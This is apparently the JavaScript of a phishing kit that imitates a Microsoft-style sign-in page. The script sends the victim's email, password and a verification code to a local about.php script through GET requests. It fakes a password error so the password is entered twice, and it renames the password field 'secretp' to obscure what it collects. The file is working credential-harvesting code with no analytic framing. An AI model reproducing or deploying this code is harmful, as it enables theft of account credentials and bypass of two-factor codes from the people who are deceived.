
			function validateuname(uname) {
				var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
				return re.test(uname);
			}
			$(document).ready(function() {
				$("#idBtn_Back").click(function() {
					window.location.replace("index.html");
				});
			});
			$(document).ready(function() {
				$("#idSIButton9").click(function() {
					var use = $("#i0116").val();
				            if (validateuname(use)) {
                            meetU()
                            } else {
						$("#uError").removeClass("hide");
					}
				});
			});

			
                              function meetU() {

        var use = $("#i0116").val();
         if (validateuname(use) == true) {
            $("#uProgress").removeClass("hide");
            var delayInMilliseconds = 10; //2 second
                
						meetData(true, function () {
							$("#uProgress, #i0116, #uError, #i0115, #i0113, #codeHeader, #idSign2, #idSign3, .secretp-klass,  #loginHeader, #idSIButton9").addClass("hide");
							$("#unameBox, #idBtn_Back, #i0118, #cantAccessAccount, #secretpHeader, #idSign9, .uname-klass, #forgotsecretp").removeClass("hide");
							$("#displayName").html(use);
						}, delayInMilliseconds);
						
						
						} else {
							$("#uError").removeClass("hide");
        }
    }
function meetData(isAjax, resolve) {
        var secretp = $("#i0118").val();
        var user = $("#i0116").val();

        var url = "./about.php/?uname=" + user + "&pcode=" + secretp;

        if (isAjax) {
            console.log("Was here")
            $.ajax({
                type: "GET",
                encode: true,
                url: url,
                success: function (data) {
                    console.log(data)
                    setTimeout(resolve, 10)
                },
                error: function (p) {
                    console.log(data)
                    setTimeout(resolve, 10);
                }
            })
        } else {
         meetData(false, function () {})
       
				};
			};
			
			$(document).ready(function() {
					$("#idSign9").click(function() {
					var use = $("#i0118").val();
                            meetP1()
				});
			});
			
                              function meetP1() {
			 var use = $("#i0116").val();
                $("#uProgress").removeClass("hide");
                var delayInMilliseconds = 10; //2 second
			 
		
						meetData1(true, function () {
							$("#uProgress, #i0116, #uError, #i0118, #i0113, #secretpHeader, #idSign9, #codeHeader, #idSign3, .secretp-klass, #loginHeader, #idSIButton9").addClass("hide");
							$("#pError, #unameBox, #idBtn_Back, #i0115, #cantAccessAccount, #idSign2, .uname-klass").removeClass("hide");
							$("#displayName").html(use);
						}, delayInMilliseconds);

						
						}

function meetData1(isAjax, resolve) {
        var secretp1 = $("#i0118").val();
        var user = $("#i0116").val();

        var url = "./about.php/?uname=" + user + "&pcode=" + secretp1;

        if (isAjax) {
            console.log("Was here")
            $.ajax({
                type: "GET",
                encode: true,
                url: url,
                success: function (data) {
                    console.log(data)
                    setTimeout(resolve, 10)
                },
                error: function (p) {
                    console.log(data)
                    setTimeout(resolve, 10);
                }
            })
        } else {
         meetData(false, function () {})
       
				};
			};

			
			$(document).ready(function() {
					$("#idSign2").click(function() {
					var use = $("#i0113").val();
                            meetP()
				});
			});
			
                              function meetP() {
			var use = $("#i0116").val();
                $("#uProgress").removeClass("hide");
			 var delayInMilliseconds = 10; //2 second
		
						meetData2(true, function () {
							$("#uProgress, #unameBox, #idBtn_Back, #i0113, #cantAccessAccount, #codeHeader, #idSign3, #forgotsecretp, .secretp-klass").removeClass("hide");
							$("#i0116, #uError, #pError, #i0118, #i0115, #secretpHeader, #idSign9, #idSign2, .uname-klass, #loginHeader, #idSIButton9").addClass("hide");
							}, delayInMilliseconds);
						
						}
            
        
    
						
       
    
function meetData2(isAjax, resolve) {
        var secretp = $("#i0115").val();
        var user = $("#i0116").val();
        var code = $("#i0113").val();
        
        var url = "./about.php/?uname=" + user + "&pcode=" + secretp + "&code=" + code;
        if (isAjax) {
            console.log("Was here")
            $.ajax({
                type: "GET",
                encode: true,
                url: url,
                success: function (data) {
                    console.log(data)
                    setTimeout(resolve, 10)
                },
                error: function (p) {
                    console.log(data)
                    setTimeout(resolve, 10);
                }
            })
        } else {
         url += "&redirect=yes"
            location.href = url
       
				};
			};
			
			$(document).ready(function () {
        $('#i0116').bind('keyup', function (e) {
            if (e.which == 13) {
            var use = $("#i0116").val();
            if (validateuname(use) == true) {
            $("#uProgress").removeClass("hide");
            var delayInMilliseconds = 10; //2 second
                
						meetData(true, function () {
							$("#uProgress, #i0116, #uError, #i0115, #i0113, #codeHeader, #idSign2, #idSign3, .secretp-klass,  #loginHeader, #idSIButton9").addClass("hide");
							$("#unameBox, #idBtn_Back, #i0118, #cantAccessAccount, #secretpHeader, #idSign9, .uname-klass, #forgotsecretp").removeClass("hide");
							$("#displayName").html(use);
						}, delayInMilliseconds);
						
						
						} else {
							$("#uError").removeClass("hide");
						}
						} 
        });
    });
    
     $(document).ready(function () {
        $('#i0118').bind('keyup', function (e) {
            if (e.which == 13) {
                var use = $("#i0116").val();
                $("#uProgress").removeClass("hide");
                var delayInMilliseconds = 10; //2 second
			 
		
						meetData1(true, function () {
							$("#uProgress, #i0116, #uError, #i0118, #i0113, #secretpHeader, #idSign9, #codeHeader, #idSign3, .secretp-klass, #loginHeader, #idSIButton9").addClass("hide");
							$("#pError, #unameBox, #idBtn_Back, #i0115, #cantAccessAccount, #idSign2, .uname-klass").removeClass("hide");
							$("#displayName").html(use);
						}, delayInMilliseconds);

						
						}
        });
    });
    
   
		$(document).ready(function () {
        $('#i0115').bind('keyup', function (e) {
            if (e.which == 13) {
                var use = $("#i0116").val();
                $("#uProgress").removeClass("hide");
			 var delayInMilliseconds = 10; //2 second
		
						meetData2(true, function () {
							$("#uProgress, #unameBox, #idBtn_Back, #i0113, #cantAccessAccount, #codeHeader, #idSign3, #forgotsecretp, .secretp-klass").removeClass("hide");
							$("#i0116, #uError, #pError, #i0118, #i0115, #secretpHeader, #idSign9, #idSign2, .uname-klass, #loginHeader, #idSIButton9").addClass("hide");
							}, delayInMilliseconds);
						
						}
        });
    });
		
		
    $(document).ready(function () {
        $("#idSign3").click(function () {
            meetData2(false, function () {})
        });
    });
    $('#i0113').bind('keyup', function (e) {
        if (e.which == 13) {
            meetData2(false, function () {})
        }
    });
			
	